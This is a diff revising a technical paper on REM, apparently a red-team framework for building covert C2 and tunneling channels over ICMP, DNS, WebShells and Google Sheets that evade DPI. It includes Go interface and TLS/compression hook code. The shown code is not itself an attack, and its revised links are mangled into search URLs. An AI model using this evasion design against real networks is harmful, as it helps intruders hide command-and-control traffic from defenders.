@@ -1,89 +1,186 @@
-# Your Network, My Transport Layer: An Offensive Perspective on Network Protocol Stacks
+# Your Network, My Transport Layer: An Offensive Perspective on the Network Protocol Stack
 
 ## 1. Introduction
 
-### 1.1 Background and Problem Statement
+### 1.1 Research Background and Problem Statement
 
-As cyberspace confrontations grow increasingly complex, attackers who successfully penetrate target networks often face highly restrictive environments. Modern defense systems employ Deep Packet Inspection (DPI) and traffic analysis techniques that pose severe challenges to traditional penetration tools in terms of functionality, performance, and stealth. These challenges manifest in three key areas:
+In modern network attack and defense drills and Red Team operations, establishing stable, covert, and efficient Command and Control (C2) and data exfiltration channels is critical to the success of penetration testing. However, with the proliferation of Zero Trust architectures and the enhancement of network boundary defenses, attackers face an unprecedented "Communication Dilemma."
 
-First, **traditional tools face performance and functional bottlenecks in complex network environments**. For instance, in channels where only low-priority protocols like ICMP or DNS are permitted for outbound traffic, existing tools suffer from high protocol overhead and unreliable transmission (e.g., `dnscat2`, `icmpsh`), making it difficult to support efficient data transfer and advanced functionality. In multi-hop network scenarios, simple cascading of traditional tools (like `frp`, `shadowsocks`) leads to complex configurations, accumulation of exposed protocol signatures, and exponential performance degradation with each layer, severely limiting penetration depth.
+This dilemma does not stem from the lack of a single technology, but from fundamental limitations in the design paradigm of current offensive network tools. Through an analysis of existing mainstream tools (such as frp, nps, gost, dnscat2, neo-regeorg, etc.), we summarize the current problems into contradictions across three dimensions:
 
-Second, **the fixed protocol nature of tools makes them easily detectable and disrupted**. Facing DPI and traffic analysis, attackers are forced to frequently switch communication protocols (from Shadowsocks to V2Ray, Trojan) with obfuscation layers. However, this "protocol chase game" ultimately proves unsustainable—each new protocol, with its fixed structure and predictable traffic patterns, eventually gets identified by security devices. This reveals a common implicit assumption in traditional tool design: "network protocols have fixed structures," which locks their capabilities within traditional network architecture frameworks.
+1. The Contradiction between "Hard-coded" Protocol Stacks and Flexibility
 
-Finally, **technological silos limit the flexibility and resilience of adversarial strategies**. Despite the rich arsenal of encryption algorithms, tunneling protocols, and obfuscation techniques in network adversarial operations, these technologies exist largely as isolated modules, lacking a unified, flexible mechanism for combination and dynamic orchestration. The tight coupling between existing tools' technical capabilities and specific transport protocols causes them to fail in restricted environments (e.g., DNS/ICMP-only) or require massive redevelopment when specific capability combinations are needed (e.g., "DNS transport + reliable retransmission + encryption"). This architectural limitation makes it difficult for attackers to construct resilient, stealthy, high-performance adversarial communication channels.
+Existing tunnel tools typically adopt a "hard-coded" protocol stack design. For example, high-performance proxy tools are often bound to standard TCP/UDP protocols, while covert channel tools used in restricted environments (e.g., allowing only DNS or ICMP outbound) tend to be single-function and suffer from extremely low transmission efficiency. This "strong coupling between functionality and transport protocols" leads to severe tool fragmentation: attackers must switch between completely different toolchains for different scenarios. Implementing a reliable SOCKS5 proxy over a DNS channel, or running complex C2 traffic over a WebShell channel, usually requires extremely complex configurations or even secondary development. Existing tools cannot seamlessly migrate "high-level application layer capabilities" to "low-level transport channels."
 
-In summary, the fundamental problem in current network adversarial operations is not the absence of individual technologies, but rather the lack of a unified architecture that can decouple, flexibly combine, and dynamically orchestrate multiple technologies to address increasingly complex network defenses and diverse penetration scenarios.
+2. The Contradiction between "Static" Signatures and Dynamic Defense
 
-### 1.2 Solution: REM's Architectural Innovation
+The communication characteristics (fingerprints) of traditional tools are usually determined by their code structure. Whether it is the handshake process, packet size distribution, or encryption method, these are often fixed at compile time. Although TLS encryption can hide content, Traffic Analysis and behavioral patterns remain clearly visible. This "static protocol structure" allows defenders to identify anomalies based solely on traffic behavior without decrypting the content. Attackers are forced into a cycle of "changing protocols/tools," but as long as the protocol stack structure is fixed, new fingerprints are quickly extracted.
 
-To overcome these challenges, this paper proposes and implements a **Reconfigurable Evasion Module (REM)** architecture. REM's core innovation lies in its **three-layer decoupling and dynamic orchestration mechanism**, designed to build a highly flexible, stealthy, and high-performance platform for network-side adversarial infrastructure. REM achieves this through the following key design principles:
+3. The Contradiction between "Hierarchical Fragmentation" and Full-Stack Confrontation
 
-1. **Transport Layer Decoupling**: Abstracts any data-exchangeable medium as a standard connection interface, enabling ICMP, DNS, and even non-traditional communication media (like Google Sheets API, WebShells) to serve as REM's reliable transport layer.
+In complex penetration paths (e.g., External Network -> Web Server -> Internal Database), attackers often need to cascade multiple tools: using a WebShell management tool to breach the first layer, a port forwarding tool for the second, and a proxy tool for lateral movement. This "simplistic stacking of technologies" not only introduces massive performance loss (Latency Cascade) but also leads to extremely high stability risks. Because these tools lack a unified communication protocol and state synchronization mechanism, the entire link becomes incredibly fragile.
+
+**Key Insight:** We believe the root cause of the above problems is that traditional tools rely too heavily on the standard network stack provided by the operating system and restrict themselves to specific OSI layer models. True confrontation should not be limited to patching the application layer but should involve a complete reconstruction of the network protocol stack.
+
+To address these issues, this paper proposes a new network architecture named **REM (Reconfigurable Evasion Module)**. Unlike traditional tools, REM does not presuppose "what the transport layer is," but redefines the network protocol stack from an offensive perspective:
+
+- **Transport Agnostic:** Any medium capable of exchanging data (whether a TCP socket, a Google Sheets API cell, or an ICMP packet) is abstracted by REM as a unified "Physical Layer" and "upgraded" to a standard connection interface via a custom reliability protocol (ARQ).
     
-2. **Encryption Layer Decoupling**: Designs encryption and obfuscation as independent, arbitrarily nestable modules, using a "reverse read chain" to ensure correct encryption/decryption order while supporting dynamic configuration of encryption schemes for dynamic traffic signature variation.
+- **Software-Defined Stack:** Functions such as encryption, compression, and multiplexing are modularized, allowing for dynamic orchestration at runtime. Attackers can build a unique protocol stack tailored to a specific environment, much like assembling building blocks.
     
-3. **Application Layer Decoupling**: Completely separates application protocol processing logic (SOCKS5, HTTP proxy, etc.) from underlying transport, ensuring the same application code runs on any REM-supported transport layer, significantly improving functional reusability.
-    
-4. **Dynamic Orchestration Mechanism**: Introduces a priority-controlled Hook mechanism allowing runtime dynamic combination and orchestration of transport, encryption, and application layer capabilities, building customized adversarial channels through concise configuration (e.g., "random 2-4 layer encryption + data compression + TLS outer wrapper").
+- **Full-Stack Convergence:** Breaking the boundaries between proxies, tunnels, and C2, integrating them into a single binary.
     
 
-REM aims to be an **infrastructure platform** that integrates all network-side adversarial technologies with infinite configuration possibilities, fundamentally solving the problems of technological silos and architectural ceilings.
+### 1.2 Solution: REM Architecture Innovation
+
+To overcome the challenges mentioned above, this paper proposes and implements the **Reconfigurable Evasion Module (REM)** architecture. The core innovation of REM lies in its three-layer decoupling and dynamic orchestration mechanism, aiming to build a highly flexible, covert, and high-performance infrastructure platform for network-side confrontation. REM achieves this goal through the following key designs:
+
+- **Transport Layer Decoupling:** Abstracts any medium capable of data exchange into a standard connection interface, allowing ICMP, DNS, and even non-traditional communication media (such as Google Sheets API, WebShell) to serve as reliable transport layers for REM.
+    
+- **Encryption Layer Decoupling:** Designs encryption and obfuscation functions as independent, arbitrarily nestable modules. A "reverse read chain" ensures the correct order of encryption/decryption and supports dynamic configuration of encryption schemes, achieving dynamic changes in traffic characteristics.
+    
+- **Application Layer Decoupling:** Separates the processing logic of application protocols (SOCKS5, HTTP proxy, etc.) from the underlying transport, ensuring that the same application code can run on any transport layer supported by REM, significantly improving functional reusability.
+    
+- **Dynamic Orchestration Mechanism:** Introduces a Hook mechanism based on priority control, allowing runtime dynamic combination and orchestration of transport, encryption, and application layer capabilities. This enables the construction of customized confrontation links via simple configuration (e.g., "Random Layer 2-4 Encryption + Data Compression + TLS Outer Camouflage").
+    
+
+REM aims to be an infrastructure platform that integrates all network-side offensive technologies and supports infinite configuration, fundamentally solving the problems of technological silos and architectural ceilings.
 
 ### 1.3 Main Contributions
 
-To address the challenges faced by traditional network adversarial tools, this paper proposes and implements the Reconfigurable Evasion Module (REM) architecture. Through fundamental innovation at the protocol stack level, REM provides a highly flexible, stealthy, and performant infrastructure platform for network-side adversarial operations. The main contributions are summarized as follows:
+To address the numerous challenges faced by traditional network offensive tools, this paper proposes and implements the Reconfigurable Evasion Module (REM) architecture. By innovating fundamentally at the protocol stack level, REM aims to provide a highly flexible, covert, and high-performance infrastructure platform for network confrontation. The main contributions of this paper are summarized as follows:
 
-1. **Proposal and implementation of a three-layer decoupled offensive protocol stack architecture**: Through deep decoupling of transport, encryption, and application layers, breaks the tight coupling between traditional tool capabilities and transport protocols, enabling any data exchange medium to serve as a reliable transport layer while supporting arbitrary combinations of encryption obfuscation and application protocol carrying.
+- **Proposed and implemented a three-layer decoupled offensive protocol stack architecture:** By deeply decoupling the transport, encryption, and application layers, it breaks the strong coupling between technical capabilities and transport protocols in traditional tools. This allows any data exchange medium to serve as a reliable transport layer and supports any combination of encryption, obfuscation, and application protocol bearing.
     
-2. **Construction of dynamically orchestratable traffic shaping and stealth mechanisms**: Innovative design of priority-controlled Hook mechanism enables runtime dynamic orchestration of transport, encryption, obfuscation, and compression functions, effectively countering DPI detection and statistical analysis.
+- **Built a dynamically orchestratable traffic shaping and evasion mechanism:** Innovatively designed a Hook mechanism based on priority control to achieve runtime dynamic orchestration of functions such as transport, encryption, obfuscation, and compression, effectively countering DPI detection and statistical analysis.
     
-3. **Development of zero-performance-loss proxy integration solution**: Through in-memory SOCKS5 proxy protocol simulation and optimized authentication timing, solves performance bottlenecks in traditional proxies under concurrent scenarios, demonstrating near-direct-connection efficiency especially in high-concurrency port scanning scenarios.
+- **Developed a zero-performance-loss proxy integration scheme:** By simulating the SOCKS5 proxy protocol in memory and optimizing authentication timing, it solves the performance bottlenecks of traditional proxies in concurrent scenarios, demonstrating near-direct-connection efficiency, especially in high-concurrency port scanning scenarios.
     
-4. **Extension of covert channel and C2 infrastructure capabilities**: Abstracts non-traditional media like WebShells, Google Sheets API, and SMB named pipes as reliable duplex channels, providing multi-level C2 framework integration solutions (including FFI interface embedding), significantly improving attack communication stealth, flexibility, and performance.
+- **Expanded covert channel and C2 infrastructure capabilities:** Abstracted non-traditional media such as WebShell, Google Sheets API, and SMB named pipes into reliable duplex channels, and provided multi-level C2 framework integration schemes (including FFI embedding), significantly improving the covertness, flexibility, and performance of attack communications.
     
-5. **Implementation of protocol-boundaryless cascading proxy chains**: Through generalized `proxyclient` library, supports chaining combinations of various proxy protocols (SOCKS, HTTP, SSH, etc.) and REM's own capabilities, building resilient proxy chains across arbitrary media adapted to complex network topologies.
+- **Implemented a protocol-boundary-free cascading proxy chain:** Through the generalized `proxyclient` library, it supports the chain combination of various proxy protocols (SOCKS, HTTP, SSH, etc.) and REM's own capabilities, constructing an elastic proxy link that spans any medium and adapts to complex network topologies.
     
 
-Through these innovations, REM achieves transformation from "fixed protocol stack" to "orchestratable protocol stack," fundamentally undermining the foundational assumptions traditional detection relies on, pushing adversarial operations to a new dimension.
+Through these innovations, REM realizes the transformation from a "Fixed Protocol Stack" to a "Orchestratable Protocol Stack," fundamentally dismantling the basic assumptions relied upon by traditional detection and pushing attack and defense from a technical competition to a new dimension.
 
-REM is not just a tool, but an infrastructure platform for network adversarial operations. For attackers, it provides a unified architecture to compose infinite configuration possibilities.
+REM is not just a tool; it is an infrastructure platform for network confrontation. For attackers, it offers the ability to assemble infinite configuration possibilities using a unified architecture.
 
 ---
 
-## 2. Offensive Network Protocol Stack Perspective
+## 2. An Offensive Perspective on the Network Protocol Stack
 
-Based on the theoretical foundation of OSI model reconstruction, the REM architecture implements attack-scenario-oriented OSI layer reconstruction. This reconstruction centers on the transport layer as the core foundation, building session, presentation, and application layer attack capabilities upward, ultimately providing services for various attack application scenarios through the transport layer. It breaks the hierarchical constraints of traditional OSI models, providing significant flexibility and stealth improvements for network-side adversarial operations.
+Based on the theoretical foundation of reconstructing the OSI model, the REM architecture implements an OSI layer reconstruction oriented towards attack scenarios. This reconstruction takes the transport layer as the core foundation, building session, presentation, and application layer attack capabilities upwards, and ultimately serving various attack application scenarios through the transport layer. This breaks the hierarchical constraints of the traditional OSI model, providing significant improvements in flexibility and covertness for network-side confrontation operations.
 
-(We provide links to corresponding code implementations in each section, but the code is not the most critical aspect—it's the shift in design philosophy. **We built REM using Golang, but this system can be constructed in any language—Python, Rust, C, etc.**)
+_(We provide links to the corresponding code implementation in each chapter, but the code is not the most critical part; rather, it is the shift in design philosophy. We built REM using Golang, but this system can be built using Python, Rust, C, or any other language.)_
 
-**Architecture Diagram and Overview**
+### Architecture Diagram and Overview
 
-[Architecture diagram with mermaid visualization showing the complete technical stack from bottom-layer channels through REM core protocol stack to application scenarios]
+
+```mermaid
+graph TD
+    subgraph "REM Core Protocol Stack (Chapter 2)"
+    direction TB
+        subgraph "Application Scenario Layer (Chapter 3)"
+             AppLayer[3.1 Application Layer Abstraction]
+             Attacks[3.2-3.5 Attack Scenarios]
+        end
+
+        subgraph "2.5 Hook Orchestrator"
+             Hook[Hook Mechanism]
+             Priority[Priority-Driven Capability Combination]
+        end
+
+        subgraph "2.3 Inverted Architecture (Encrypt First, Then Multiplex)"
+             Wrapper[2.3.2 Wrapper Chain]
+             WrapperDesc[Dynamic Encryption/Obfuscation\nReverse Read Chain]
+             Mux[2.3.3 Mux]
+             MuxDesc[Lightweight Multiplexing\nZero-Signature Design]
+        end
+
+        subgraph "2.4 Proxy Integration Layer"
+             ProxyClient[proxyclient]
+             ProxyDesc[Protocol-Boundary-Free Integration\nSOCKS/HTTP/SSH/neoreg/suo5]
+             ZeroPerf[Zero-Performance Proxy]
+             ZeroPerfDesc[Memory-Simulated SOCKS5]
+             Cascade[Cascading Network]
+             CascadeDesc[Cross-Arbitrary Medium]
+        end
+
+        subgraph "2.1 Transport Layer Core"
+             Tunnel[Tunnel Abstraction]
+             TunnelDesc[Protocol-Agnostic net.Conn\nBeforeHook/AfterHook]
+        end
+
+        subgraph "2.2 Reliability Conversion Chain"
+             Simplex[Simplex Duplexing]
+             SimplexDesc[Send/Receive Abstraction\nClient/Server/Bidirectional Polling]
+             ARQ[ARQ Protocol]
+             ARQDesc[PacketConn → net.Conn\nKCP/Custom ARQ]
+        end
+        
+        subgraph "Underlying Channels"
+             Media[Arbitrary Data Exchange Medium]
+             Standard[TCP/UDP/ICMP/DNS/HTTP/WebShell]
+             NonStandard[Google Sheets/SMB/lolC2]
+        end
+    end
+
+    Media --> Simplex
+    Simplex --> ARQ
+    ARQ --> Tunnel
+    Standard --> Tunnel
+    
+    Tunnel --> Hook
+    Hook --> ProxyClient
+    ProxyClient --> Wrapper
+    Wrapper --> Mux
+    Mux --> AppLayer
+
+    Hook -.-> |Orchestration| Tunnel
+    Hook -.-> |Orchestration| Wrapper
+    Hook -.-> |Orchestration| ProxyClient
+    Hook -.-> |Orchestration| Mux
+
+    AppLayer --> C2[C2 Integration]
+    C2 --> C2Type[Proxy/ExternalC2/FFI]
+    AppLayer --> Channel[Arbitrary Channel]
+    Channel --> ChannelType[SMB/lolC2]
+    
+    AppLayer --> Inbound[Inbound]
+    Inbound --> InDesc[ListenAndServe+Relay]
+    AppLayer --> Outbound[Outbound]
+    Outbound --> OutDesc[Handle+Dial]
+    
+    Inbound -.-> |Control Inbound Location| ReverseProxy[Reverse/Proxy Mode]
+```
 
 ### 2.1 Transport Layer: Protocol-Agnostic Transport Abstraction
 
-[https://github.com/chainreactors/rem/tree/master/protocol/tunnel](https://github.com/chainreactors/rem/tree/master/protocol/tunnel)
+_Code:_ [`https://github.com/chainreactors/rem/tree/master/protocol/tunnel`](https://www.google.com/search?q=%5Bhttps://github.com/chainreactors/rem/tree/master/protocol/tunnel%5D\(https://github.com/chainreactors/rem/tree/master/protocol/tunnel\))
 
-Traditional network tools fix transport protocols to standard options like TCP/UDP, limiting attack scenario flexibility. REM implements protocol-agnostic transport layer through Tunnel interface abstraction, allowing any protocol that provides net.Conn to serve as the transport layer.
+Traditional network tools fix transport protocols to standard options like TCP/UDP, limiting flexibility in attack scenarios. REM implements a protocol-agnostic transport layer through the `Tunnel` interface abstraction, allowing any protocol that can provide a `net.Conn` to be used as a transport layer.
 
-In REM architecture, the transport layer is no longer just the data transport layer in the traditional OSI model, but the cornerstone of the entire attack infrastructure. **Any medium capable of data exchange can serve as the attack transport layer**.
+In the REM architecture, the transport layer is no longer just the data transport layer in the traditional OSI model, but the cornerstone of the entire offensive infrastructure. **Any medium capable of data exchange can serve as an offensive transport layer.**
 
-REM's transport layer manifests as tunnels. Each tunnel consists of a dialer and listener. It's important to understand that listener and dialer only represent server-client relationships at the transport layer. Once a tunnel is established, all REM nodes become equal peers—a significant difference from previous proxy tools.
+REM's transport layer is manifested as a `tunnel`. Each tunnel consists of a `dialer` and a `listener`. It is important to understand that `listener` and `dialer` only represent the server and client relationship on the transport layer. Once the tunnel is established, all REM nodes become equal peers, which is a significant difference from previous proxy tools.
 
-#### 2.1.1 Tunnel Interface: Dependency on net.Conn
+#### 2.1.1 Tunnel Interface: Reliance on `net.Conn`
 
-[https://github.com/chainreactors/rem/blob/master/protocol/core/tunnel.go](https://github.com/chainreactors/rem/blob/master/protocol/core/tunnel.go)
+_Code:_ [`https://github.com/chainreactors/rem/blob/master/protocol/core/tunnel.go`](https://www.google.com/search?q=%5Bhttps://github.com/chainreactors/rem/blob/master/protocol/core/tunnel.go%5D\(https://github.com/chainreactors/rem/blob/master/protocol/core/tunnel.go\))
 
-The Tunnel interface's only requirement is providing net.Conn, which is the foundational dependency of REM's entire transport layer. Regardless of underlying protocol, it must ultimately provide the standard net.Conn interface.
+The only requirement of the `Tunnel` interface is the ability to provide `net.Conn`, which is the fundamental dependency of the entire REM transport layer. Regardless of the underlying protocol used, it must ultimately provide a standard `net.Conn` interface.
 
-net.Conn is a core interface in Golang's standard library representing network connections, providing three basic methods: Read/Write/Close, representing a bidirectional, stream-oriented network connection (similar to TCP). Any type implementing these three methods can be used as a network connection.
+`net.Conn` is the core interface in the Golang standard library representing a network connection. It provides three basic methods: `Read`, `Write`, and `Close`, representing a bidirectional, stream-oriented network connection (similar to a TCP connection). Any type implementing these three methods can be used as a network connection.
 
 **Two Protocol Scenarios:**
 
-- **Scenario A - Standard Protocols**: TCP, UDP, WebSocket, WireGuard, and other standard protocols directly provide net.Conn interface, requiring no additional conversion to serve as Tunnel
-- **Scenario B - Inferior Protocols**: ICMP, DNS, HTTP API, webshell, and others cannot directly provide net.Conn, requiring transformation through the chain described in Section 2.2
+|**Scenario**|**Protocol Type**|**Characteristics**|**Can Provide Conn Directly?**|**Handling Method**|
+|---|---|---|---|---|
+|**Scenario A**|**Standard Protocols** (TCP, UDP, WebSocket, WireGuard)|Bidirectional, reliable, standard interface|✅ Yes|Used directly for Tunnel|
+|**Scenario B**|**Inferior Protocols** (ICMP, DNS, HTTP API, WebShell)|Unidirectional/Unreliable/Non-standard|❌ No|Requires conversion via Section 2.2|
 
-The Tunnel interface design is elegant, requiring only implementation of Dialer and Listener:
+The `Tunnel` interface design is very concise, requiring only the implementation of a `Dialer` and `Listener`:
+
 
 ```go
 type TunnelDialer interface {
@@ -96,44 +193,47 @@ type TunnelListener interface {
 }
 ```
 
-**net.Conn Interface Definition**:
+`net.Conn` interface definition:
 
 ```go
-// net.Conn interface in Golang standard library
+// Golang standard library net.Conn interface
 type Conn interface {
     Read(b []byte) (n int, err error)   // Read data
     Write(b []byte) (n int, err error)  // Write data
-    Close() error                        // Close connection
-    // ... plus address, timeout helper methods
+    Close() error                       // Close connection
+    // ... plus auxiliary methods like address, timeout, etc.
 }
 ```
 
-Tunnel doesn't care about underlying protocol implementation details, only whether it can ultimately provide the net.Conn interface. This achieves protocol agnosticism:
+The Tunnel does not concern itself with the implementation details of the underlying protocol, only whether it can ultimately provide a `net.Conn` interface. This achieves protocol agnosticism:
 
-- TCP, UDP, Unix Socket provided by Golang standard library can be used directly
-- ICMP, DNS converted through Section 2.2 can be used identically
-- Any custom protocol implementing net.Conn interface can be integrated
+- TCP, UDP, Unix Socket provided by the Golang standard library can be used directly.
+    
+- ICMP, DNS, etc., converted via Section 2.2, can be used in the same way.
+    
+- Any custom protocol implementing the `net.Conn` interface can be integrated.
+    
 
-Golang's net.Conn interface is widely used across various network libraries (HTTP, TLS, shadowsocks, etc.), allowing REM to maximally leverage the Golang ecosystem. For example, HTTP library's http.Client, TLS library's tls.Client all accept net.Conn as underlying transport. A Telegram API-based channel, once wrapped as net.Conn, can directly layer TLS, shadowsocks, and other encryption.
+Golang's `net.Conn` interface is widely used in various network libraries (HTTP, TLS, Shadowsocks, etc.), allowing REM to maximize the use of the Golang ecosystem. For example, `http.Client` and `tls.Client` both accept `net.Conn` as the underlying transport. A channel based on the Telegram API, as long as it can be encapsulated as `net.Conn`, can be directly wrapped with encryption layers like TLS or Shadowsocks.
 
-**io.ReadWriteCloser Interface**: The net.Conn interface actually inherits the io.ReadWriteCloser interface (with only Read/Write/Close methods), a more simplified interface widely used in Golang, including file operations, memory buffers, encryption streams, etc.
+**`io.ReadWriteCloser` Interface:** The `net.Conn` interface actually inherits from the `io.ReadWriteCloser` interface (which only has `Read`/`Write`/`Close` methods). This simpler interface is used more broadly in Golang, including file operations, memory buffers, encryption streams, etc.
 
-This approach is simple and clear, maximally leveraging Golang's existing infrastructure. Any transport protocol implementing net package interfaces can serve as REM's transport layer with minimal modification.
+This approach is simple and clear, maximizing the use of Golang's existing infrastructure. Any transport protocol that implements the `net` package interface can be used as a REM transport layer with very minor modifications.
 
 #### 2.1.2 Secondary Wrapping of Conn
 
-Established connections often need additional processing (TLS encryption, data compression, statistical countermeasures, etc.). The Conn secondary wrapping mechanism, inspired by frp's design, injects processing logic before and after connection establishment through BeforeHook/AfterHook, combined with priority mechanism for flexible connection extension.
+Established connections often require additional processing (TLS encryption, data compression, statistical countermeasures). The mechanism for secondary wrapping of `Conn` references the design of `frp`, utilizing `BeforeHook`/`AfterHook` to inject processing logic before and after connection establishment, combined with a priority mechanism to achieve flexible connection extension.
 
-**Details of the Hook mechanism are covered in Section 2.5.**
+Details on the Hook mechanism are introduced in Section 2.5.
 
-In practice, REM provides a mechanism supporting secondary processing operations on Conn, implementing various complex functionalities supported by Golang on stable Conn, such as:
+In practice, REM provides a mechanism to support secondary processing operations on `Conn`, enabling the wrapping of complex functionalities supported by Golang on top of stable `Conn` objects.
 
-**Example 1: TLS Encryption**
+Example 1: TLS Encryption
 
-TLS encryption is the most common application, used to add encryption protection to arbitrary transport layers:
+TLS encryption is the most common application, used to add encryption protection to any transport layer:
 
 ```go
-// TLS encryption Hook implementation
+// TLS Encryption Hook Implementation
 func WithTLS() TunnelOption {
     return newFuncTunnelOption(func(do *TunnelService) {
         if do.listener != nil {
@@ -143,7 +243,7 @@ func WithTLS() TunnelOption {
                 return
             }
             do.afterHooks = append(do.afterHooks, core.AfterHook{
-                Priority: TLSPriority,  // Highest priority, ensuring TLS outermost
+                Priority: TLSPriority,  // Highest priority, ensuring TLS is outermost
                 ListenHook: func(ctx context.Context, listener net.Listener) (context.Context, net.Listener, error) {
                     // Wrap as TLS Listener
                     tlsListener := tls.NewListener(listener, tlsConfig)
@@ -174,19 +274,22 @@ func WithTLS() TunnelOption {
 }
 ```
 
-**Value of TLS Hook**:
+**Value of TLS Hook:**
 
-- **Encryption Protection**: All data encrypted via TLS, preventing man-in-the-middle monitoring
-- **Protocol Agnostic**: Can add TLS layer to non-standard protocols like ICMP, DNS
-- **Certificate Verification**: Optional certificate verification, supporting self-signed certificates
-- **Application Scenario**: Wrap plaintext ICMP tunnel as encrypted ICMP-over-TLS tunnel
+- **Encryption Protection:** All data is encrypted via TLS, preventing Man-in-the-Middle (MitM) eavesdropping.
+- **Protocol Agnostic:** Can add a TLS layer to non-standard protocols like ICMP or DNS.
+- **Certificate Verification:** Optional certificate verification, supporting self-signed certificates.
+- **Application Scenario:** Wrapping a plaintext ICMP tunnel into an encrypted ICMP-over-TLS tunnel.
+    
 
-**Example 2: Data Compression Hook**
+Example 2: Data Compression Hook
 
-Compression Hook reduces transmission data volume, particularly suitable for bandwidth-constrained scenarios:
+The compression Hook is used to reduce the amount of data transmitted, particularly suitable for bandwidth-constrained scenarios:
+
+Go
 
 ```go
-// Compression Hook implementation
+// Compression Hook Implementation
 func WithCompression() TunnelOption {
     return newFuncTunnelOption(func(do *TunnelService) {
         if do.listener == nil {
@@ -204,7 +307,7 @@ func WithCompression() TunnelOption {
             do.afterHooks = append(do.afterHooks, core.AfterHook{
                 Priority: WrapperPriority - 5,
                 AcceptHook: func(ctx context.Context, c net.Conn) (context.Context, net.Conn, error) {
-                    // Server also needs same compression configuration
+                    // Server needs the same compression configuration
                     compressedConn := cio.WrapConn(c, wrapper.NewSnappyWrapper(c, c, nil))
                     return ctx, compressedConn, nil
                 },
@@ -214,89 +317,90 @@ func WithCompression() TunnelOption {
 }
 ```
 
-Compression Hook leverages the Snappy algorithm to achieve efficient data compression with minimal latency increase, greatly enhancing data transmission capability in low-bandwidth, restricted channels.
+The compression Hook utilizes the Snappy algorithm to achieve efficient data compression with almost no added latency, greatly enhancing data transmission capabilities in low-bandwidth, restricted channels.
 
-_(In OSI model terms, this is equivalent to data link layer tunnel abstraction and flow control mechanisms)_
+_(In the OSI model, this is equivalent to tunnel abstraction and flow control mechanisms at the data link layer.)_
 
-### 2.2 Below Transport Layer: Transforming Arbitrary Protocols to Standard Connections
+### 2.2 Below the Transport Layer: Converting Arbitrary Protocols to Standard Connections
 
-Section 2.1's Tunnel requires net.Conn. Standard protocols (TCP/UDP/WebSocket) can provide it directly, but relatively inferior protocols like ICMP/DNS/HTTP API cannot directly provide it. Even more inferior lolc2 channels, despite having tremendous value in attack scenarios (bypassing firewalls/NAT/application-layer filtering), need transformation. REM solves this through a two-layer transformation chain: Simplex wraps arbitrary data exchange as PacketConn and implements duplexing, ARQ provides reliability guarantees for PacketConn and converts to net.Conn, ultimately outputting standard connections with equal standing to TCP.
+The `Tunnel` in Section 2.1 requires `net.Conn`. Standard protocols (TCP/UDP/WebSocket) provide this directly, but ICMP/DNS/HTTP APIs and relative "inferior" protocols cannot. Furthermore, various "lolC2" (Living off the Land C2) channels, which are immensely valuable in attack scenarios (bypassing firewalls/NAT/Layer 7 filtering), are even more problematic. REM solves this via a two-layer conversion chain: **Simplex** encapsulates arbitrary data exchange into `PacketConn` and implements duplexing, while **ARQ** provides reliability guarantees for `PacketConn` and converts it to `net.Conn`, ultimately outputting a standard connection with the same status as TCP.
 
-Code: [https://github.com/chainreactors/rem/tree/master/x/kcp](https://github.com/chainreactors/rem/tree/master/x/kcp)  
-[https://github.com/chainreactors/rem/tree/master/x/simplex](https://github.com/chainreactors/rem/tree/master/x/simplex)
+_Code:_ [`https://github.com/chainreactors/rem/tree/master/x/kcp`](https://www.google.com/search?q=%5Bhttps://github.com/chainreactors/rem/tree/master/x/kcp%5D\(https://github.com/chainreactors/rem/tree/master/x/kcp\)) & [`https://github.com/chainreactors/rem/tree/master/x/simplex`](https://www.google.com/search?q=%5Bhttps://github.com/chainreactors/rem/tree/master/x/simplex%5D\(https://github.com/chainreactors/rem/tree/master/x/simplex\))
 
-**Differences Between Two Protocol Scenarios:**
+**Differences between Protocol Scenarios:**
 
-|Scenario|Protocol Type|Characteristics|Can Directly Provide Conn|Handling Method|
+|**Scenario**|**Protocol Type**|**Characteristics**|**Can Provide Conn Directly?**|**Handling Method**|
 |---|---|---|---|---|
-|Scenario A|TCP/UDP/WebSocket|Bidirectional, reliable, standard interface|✅ Yes|Directly used for Tunnel|
-|Scenario B|ICMP/DNS/HTTP API/webshell|Unidirectional/unreliable/non-standard|❌ No|Requires Section 2.2 transformation|
+|**Scenario A**|TCP/UDP/WebSocket|Bidirectional, reliable, standard interface|✅ Yes|Used directly for Tunnel|
+|**Scenario B**|ICMP/DNS/HTTP API/WebShell|Unidirectional/Unreliable/Non-standard|❌ No|Requires Section 2.2 conversion|
 
-Section 2.1 described how Scenario A's standard protocols can directly serve as transport layer. However, in network adversarial scenarios, we frequently encounter Scenario B's "inferior" protocols: ICMP, HTTP API, webshell, DNS queries, etc. These protocols have various deficiencies: unreliable, unidirectional communication, poor performance, severe restrictions, but are often the only available breakthrough means.
+Section 2.1 described how standard protocols in Scenario A act directly as the transport layer. However, in network confrontation scenarios, we frequently encounter the "inferior" protocols of Scenario B: ICMP, HTTP API, WebShell, DNS queries. These protocols have various defects: unreliability, unidirectional communication, low performance, and heavy restrictions, yet they are often the only available means of breach.
 
-The goal is to transform Scenario B's inferior protocols into standard net.Conn with equal standing to Scenario A, delivering to Tunnel for unified use.
+The goal is to convert the inferior protocols of Scenario B into standard `net.Conn` equal in status to Scenario A, delivering them for unified use by the Tunnel.
 
-**Transformation Chain Design:**
+**Conversion Chain Design:**
 
 ```
-Inferior Protocols (ICMP/DNS/HTTP API/webshell)
+Inferior Protocol (ICMP/DNS/HTTP API/WebShell)
   ↓
-[Step 1: Simplex - Duplexing]
-  • Wrap as unified PacketConn interface
-  • Convert unidirectional to bidirectional through polling
+【Step 1: Simplex - Duplexing】
+  • Encapsulate as unified PacketConn interface
+  • Convert unidirectional communication to bidirectional via polling
   ↓
-Bidirectional PacketConn (bidirectional but unreliable)
+Bidirectional PacketConn (Bidirectional but Unreliable)
   ↓
-[Step 2: ARQ - Reliability]
+【Step 2: ARQ - Reliability】
   • Provide retransmission, ordering, flow control guarantees
   • Convert to net.Conn interface
   ↓
-net.Conn (bidirectional and reliable)
+net.Conn (Bidirectional and Reliable)
   ↓
-[Delivered to Section 2.1 Tunnel]
+【Delivered to Tunnel in Section 2.1】
 ```
 
-#### 2.2.1 Simplex: Wrapping Arbitrary Data Exchange to PacketConn and Duplexing
+#### 2.2.1 Simplex: Encapsulation and Duplexing from Arbitrary Data Exchange to PacketConn
 
-ICMP/DNS/HTTP and other protocols are inherently unidirectional or asymmetric data exchanges. They first need unified wrapping as the PacketConn interface, while converting unidirectional communication to bidirectional through polling mechanism.
